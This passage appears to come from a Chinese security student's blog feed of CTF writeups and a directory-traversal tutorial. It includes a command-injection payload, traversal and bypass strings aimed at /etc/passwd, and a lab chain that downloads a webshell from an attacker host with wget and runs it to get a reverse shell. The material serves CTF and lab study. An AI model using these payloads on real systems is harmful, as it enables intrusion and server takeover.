punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">]</span>cipher<span class="token operator">=</span><span class="token string">'FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw'</span>m0re<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            m0re<span class="token operator">+=</span>base64_list<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>m0re<span class="token punctuation">)</span>flag<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>m0re<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/img_convert/898b053e7e5b53038f1cd46d0f4887d6.png" alt="image.png" loading="lazy"><br /></p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020羊城杯、第六届工控比赛部分题目复现</title>
      <link href="/posts/47c2548a/"/>
      <url>/posts/47c2548a/</url>
      
        <content type="html"><![CDATA[<h2 id="羊城杯"><a href="#羊城杯" class="headerlink" title="羊城杯"></a>羊城杯</h2><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><p><img src="https://img-blog.csdnimg.cn/2020091716473844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>环境打开<br><img src="https://img-blog.csdnimg.cn/2020091716475588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>dirsearch扫描得到两个可以访问的文件<br>一个是index.html、另一个是index.php访问index.php会有个弹窗，看到<br><img src="https://img-blog.csdnimg.cn/20200917164831241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>题目中提示菜刀。所以猜测这个是连接密码。<br>使用蚁剑连接，成功连接。<br><img src="https://img-blog.csdnimg.cn/20200917164854434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>但是，那个bbbbbbb.txt没有flag，是base64转图片，使用在线网站可以直接转换得到图片，这个是需要加上一个头的，缺少图片头的格式。<br><img src="https://img-blog.csdnimg.cn/20200917164922984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><p>黑猫警长音乐，在HTML中找到MP3文件，下载到本地。然后在010editor中打开在最后发现了PHP代码<br><img src="https://img-blog.csdnimg.cn/2020091716500129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//post传入Black-Cat-Sheriff和One-ear绕过判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'谁！竟敢踩我一只耳的尾巴！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"clandestine"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//获取一个环境变量的值</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//使用 HMAC 方法生成带有密钥的哈希值</span><span class="token comment">//PHP的类型自动转换，控制的变量只有One-ear和White-cat-monitor</span><span class="token variable">$hh</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hh</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nc"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这个看到一道类似的题目。<a href="https://www.cnblogs.com/Risk2S/p/12015809.html">代码审计——小题</a><br>同样使用hash_hmac函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sha256'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">';cat flag.php'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>最后payload</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">Black<span class="token operator">-</span><span class="token function">Cat</span><span class="token operator">-</span>Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One<span class="token operator">-</span>ear=<span class="token punctuation">;</span><span class="token function">cat</span> flag<span class="token punctuation">.</span>php&amp;nonce<span class="token punctuation">[</span><span class="token punctuation">]</span>=1</code></pre><h2 id="工控杯"><a href="#工控杯" class="headerlink" title="工控杯"></a>工控杯</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>给了一个西门子s7报文，是写入数据的。所以只需要得到返回数据的字符串就行了。<br>一组西门子S7报文。<br>03 00 00 16 11 E0 00 00 00 01 00 C1 02 10 00 C2 02 03 01 C0 01 0A(第一次握手报文)<br>03 00 00 16 11 D0 00 01 00 11 00 C0 01 0A C1 02 10 00 C2 02 03 01(第一次握手返回)<br>03 00 00 19 02 F0 80 32 01 00 00 CC C1 00 08 00 00 F0 00 00 01 00 01 03 C0(第二次握手报文)<br>03 00 00 1B 02 F0 80 32 03 00 00 CC C1 00 08 00 00 00 00 F0 00 00 01 00 01 00 F0(第二次握手返回)<br>03 00 00 43 02 F0 80 32 01 00 00 00 05 00 32 00 00 04 04 12 0A 10 02 00 01 00 00 81 00 00 00 12 0A 10 02 00 01 00 00 82 00 00 00 12 0A 10 02 00 01 00 00 83 00 00 00 12 0A 10 02 00 08 00 01 84 00 00 00(读取数据-)<br>03 00 00 2F 02 F0 80 32 03 00 00 00 05 00 02 00 1A 00 00 04 04 FF 04 00 08 00 00 FF 04 00 08 01 00 FF 04 00 08 F2 00 FF 04 00 20 AB CD EF 01(读取数据返回)<br>03 00 00 24 02 F0 80 32 01 00 00 00 09 00 0E 00 05 05 01 12 0A 10 01 00 01 00 00 83 00 00 29 00 03 00 01 01(写入数据)<br>03 00 00 16 02 F0 80 32 03 00 00 00 09 00 02 00 01 00 00 05 01 FF(写入数据返回)<br>找到了这个博客——<a href="https://www.cnblogs.com/DreamRecorder/p/9372161.html">一组西门子S7报文</a><br>将写入数据返回的报文发到公众号就行了。</p><h3 id="ICS-1"><a href="#ICS-1" class="headerlink" title="ICS_1"></a>ICS_1</h3><p>stegsolve+拼图，一个GIF动态图，逐帧查看，得到9张图片，然后在PPT里拼一下就行了，<br>中间的那张图跟其他图拼接处有的需要手工加一些点，才可以扫描出来。</p><h3 id="ICS-4"><a href="#ICS-4" class="headerlink" title="ICS_4"></a>ICS_4</h3><p>一个文件拖进kali中发现是个image图片，所以改成jpg格式就得到了一张可以打开的图片，然后使用foremost分离一下试试，有个压缩包，有密码的，在图片的详细信息中看到<br><img src="https://img-blog.csdnimg.cn/20200917165347686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>很像base64编码，进行解码<br><img src="https://img-blog.csdnimg.cn/20200917165431342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>应该是压缩包密码了<br>里面是图片，在进行stegsolve分析的时候，在file format中看到flag<br><img src="https://img-blog.csdnimg.cn/20200917165454375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="ICS-10"><a href="#ICS-10" class="headerlink" title="ICS_10"></a>ICS_10</h3><p>pdf文件，一张图片。攻防世界原题，先转换成word文档，flag就在图片下面隐藏着。<br><img src="https://img-blog.csdnimg.cn/20200917165520385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="ICS-12"><a href="#ICS-12" class="headerlink" title="ICS_12"></a>ICS_12</h3><p>ISCC2018的一个原题<br>一张猫的图片，foremost分离得到word文档，文档内的内容</p><pre class="language-bash" data-language="bash"><code class="language-bash">如是我闻：名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通</code></pre><p>展开：<br><img src="https://img-blog.csdnimg.cn/20200917165626275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200917165641476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后进行hex转str，转base64，转base32，转base16，转base64，转base32，最后再转base16就得到了flag</p><p>太菜了，继续努力，跟着学长好好学。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
            <tag> 2020工控杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全目录遍历漏洞学习及绕过</title>
      <link href="/posts/ed266cf8/"/>
      <url>/posts/ed266cf8/</url>
      
        <content type="html"><![CDATA[<p>本文首发：<a href="https://www.freebuf.com/">FreeBuf</a></p><p>原文地址：<a href="https://www.freebuf.com/vuls/247620.html">web安全目录遍历漏洞学习及绕过</a></p><h2 id="目录遍历漏洞介绍"><a href="#目录遍历漏洞介绍" class="headerlink" title="目录遍历漏洞介绍"></a>目录遍历漏洞介绍</h2><p>路径遍历攻击（也称为目录遍历）是指在访问储存在web根目录文件夹之外的文件和目录。通过操纵带有“点-斜线（..）”序列及其变化的文件或使用绝对文件路径来引用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件。</p><p>需要注意的是，系统操作访问控制（如在微软windows操作系统上锁定或使用文件）限制了对文件的访问权限。</p><p>这种攻击也称为 “点-点斜线”、“目录遍历”、“目录爬升”和“回溯”。</p><p>搭建一个存在目录遍历漏洞的虚拟机，做个实验。<br>使用Owasp zap进行漏洞扫描，挖掘漏洞。<br><img src="https://img-blog.csdnimg.cn/20200806182319691.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后复制它的URL到浏览器查看该漏洞<br><img src="https://img-blog.csdnimg.cn/20200806182338231.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>目录遍历的漏洞通过<code>../../../</code>这样的形式来进行目录读取服务器中的文件，<code>../../../../</code>越多多好，因为在终端中，<code>../</code>是返回上一级目录，到根目录使用<code>../</code>会返回当前页面。<br><img src="https://img-blog.csdnimg.cn/20200806182402342.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>一般发现目录遍历的漏洞的探针，也就是测试的时候往往是使用这样的payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://www.xxxx.com/xxx.php?page<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd</code></pre><p>看是否会返回该文件的内容，这就造成了目录遍历的漏洞产生。<br>还可以本地利用PHP环境搭建一个读取文件的脚本。来实现目录遍历。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dir_path</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$page</span><span class="token operator">=</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="一些绕过方式"><a href="#一些绕过方式" class="headerlink" title="一些绕过方式"></a>一些绕过方式</h2><ol><li>加密参数传递的数据<br>有的网站程序传递参数后会进行base64加密（当然也会有其他加密），导致我们传递的参数无法解析，所以就无法利用目录遍历，而绕过方式也很简单，就是先对参数进行base64加密后再进行传参。如：<code>?page=bTByZS50eHQ=</code></li><li>编码绕过<br>进行传参时将参数进行编码，实现绕过，比如URL编码。<code>?page=%6D%30%72%65%2E%74%78%74</code></li><li>目录限定绕过<br>有些Web应用程序是通过限定目录权限来分离的。可以使用一些特殊的符号<code>~</code>来绕过。比如提交这样的<code>xxx.php?page=~/../boot</code>。就可以直接跳转到硬盘目录下。</li><li>绕过文件后缀过滤<br>一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。<br>比如：<code>../../../../boot.ini%00.jpg</code>，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为<code>../../../../boot.ini</code>。<br>在类Unix的系统中也可以使用Url编码的换行符，例如：<code>../../../etc/passwd%0a.jpg</code>如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: <code>../../../index.php%20</code></li><li>绕过来路验证<blockquote><p>Http Referer : HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的<br>在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。</p></blockquote></li></ol><p>还有就是web服务器配置不当而造成的目录遍历漏洞，<br>可以使用谷歌语法进行查找。</p><pre class="language-bash" data-language="bash"><code class="language-bash">intitle: index of</code></pre><p>随便选择一个打开就是了。<br><img src="https://img-blog.csdnimg.cn/20200806182435422.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_39,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>可以对提交的参数进行多次编码或者多种加密。上面的几种绕过方式进行组合使用。</p><h2 id="如何利用目录遍历上传shell并拿到一个低权限"><a href="#如何利用目录遍历上传shell并拿到一个低权限" class="headerlink" title="如何利用目录遍历上传shell并拿到一个低权限"></a>如何利用目录遍历上传shell并拿到一个低权限</h2><p>利用目录遍历漏洞获取shell思路</p><ul><li>上传webshell到服务器，之后通过对应的目录遍历路径访问webshell，执行webshell。在kali linux中获取反弹shell；<br>需要和其他知识相结合，这里直接略过简单步骤<br>略过的操作：探测敏感目录，弱口令登录，查找利用的webshell上传点。<br>使用<code>/usr/share/webshells/php</code>中的反弹的webshell<br>将webshell中的IP和要监听的端口改一下<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'10.0.2.4'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span></code></pre>然后进行利用，建数据库数据表，<br><img src="https://img-blog.csdnimg.cn/2020080618254849.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后插入字段<br>写入<code>&lt;?php system(&quot;cd /tmp;wget http://10.0.2.4:8000/webshell.php;chmod +x webshell.php;php webshell.php&quot;);?&gt;</code><br>解析：切换至tmp目录，然后在kali的服务器中下载webshell，然后赋给文件执行权限，再执行。<br><img src="https://img-blog.csdnimg.cn/20200806182521542.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></li></ul><p>可以看到已经写入了数据。插入了命令<br>创建服务器用来让靶场下载webshell<br>同时开启nc侦听端口<br><img src="https://img-blog.csdnimg.cn/20200806182607942.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>上面这都是前置设置，这些设置完成后，就可以执行目录遍历漏洞下载并执行shell了<br><code> /usr/databases/shell.php</code>这个是命令所在的文件，使用目录遍历漏洞访问并执行。<br>payload</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.2.5&#x2F;view.php?page&#x3D;..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fdatabases%2Fshell.php</code></pre><p>拿到一个较低权限的shell<br><img src="https://img-blog.csdnimg.cn/20200806182629119.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>如何将此类低权限提升至root权限。我另写了一篇是关于www-data提权的文章。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 目录遍历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行无回显以及无字母数字的命令执行</title>
      <link href="/posts/afdde748/"/>
      <url>/posts/afdde748/</url>
      
        <content type="html"><![CDATA[<p>前言：最近比赛的时候看到有关命令执行的题目，然后解题过程中发现了无字母数字的命令执行，所以这篇文章学习一下这个知识。</p><h1 id="无数字字母getshell"><a href="#无数字字母getshell" class="headerlink" title="无数字字母getshell"></a>无数字字母getshell</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>无字母？如何生成字母？<br>将非字母、数字的字符经过各种变换，最后能构造出<code>a-z</code>中任意一个字符<br>一般考虑ascii码，<br>生成字母的方法：异或</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>^1<span class="token number">1</span><span class="token number">0</span>^0<span class="token number">0</span></code></pre><p>任何字母与0异或，最后得到的都是它本身。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\0">\0</span>"</span>^b<span class="token punctuation">;</span>b<span class="token comment">#特殊的异或</span><span class="token builtin class-name">echo</span> <span class="token string">"^"</span>^<span class="token string">"&lt;"</span><span class="token punctuation">;</span>b</code></pre><p>取反<br>比如：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">10101011</span>01010100<span class="token comment">#取反</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token double-quoted-string string">"和"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span> <span class="token number">3</span><span class="token shell-comment comment">#获取字母的思路</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token double-quoted-string string">"和"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">140</span><span class="token keyword">echo</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">146</span><span class="token keyword">echo</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">229</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>m<span class="token shell-comment comment">#总</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'和'</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token keyword">echo</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\x92"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m</code></pre><p>这样就由汉字得到了字母</p><p>自增<br>PHP支持C风格的前后递增与递减运算符。<br>递增递减运算符不影响布尔值，递减NULL值没有效果，递增NULL的结果是1</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span>a<span class="token keyword">echo</span> <span class="token operator">++</span><span class="token variable">$a</span><span class="token punctuation">;</span>c</code></pre><p>e3<br>以ctfshow的题目来学习一下。</p><h2 id="CTFshow-web入门55"><a href="#CTFshow-web入门55" class="headerlink" title="CTFshow web入门55"></a>CTFshow web入门55</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token 